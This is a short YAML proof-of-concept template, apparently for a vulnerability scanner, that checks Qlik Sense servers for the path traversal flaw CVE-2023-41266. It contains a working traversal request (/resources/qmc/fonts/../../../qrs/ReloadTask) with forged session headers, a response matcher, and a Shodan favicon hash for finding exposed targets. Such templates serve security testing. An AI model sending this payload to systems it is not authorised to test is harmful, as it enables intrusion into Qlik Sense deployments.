id: poc-yaml-qlik-sense-directory-traversal
info:
  name: Qlik Sense 目录遍历漏洞(CVE-2023-41266)
  severity: high
  tags:
  - CVE-2023-41266
  - 路径遍历
  finger: qlik_sense
  shodan: http.favicon.hash:-74348711
requests:
- method: GET
  path: /resources/qmc/fonts/../../../qrs/ReloadTask?xrfkey=1333333333333337&filter=.ttf
  headers:
    Cookie: X-Qlik-Session=13333333-3333-3333-3333-333333333337
    X-Qlik-Xrfkey: '1333333333333337'
  expression: status_code == 400 && contains(body,"The comparison expression does
    not consist of three elements") && contains(headers,"x-qlik-session") && !contains(body,"<")
variables: {}
transport: http
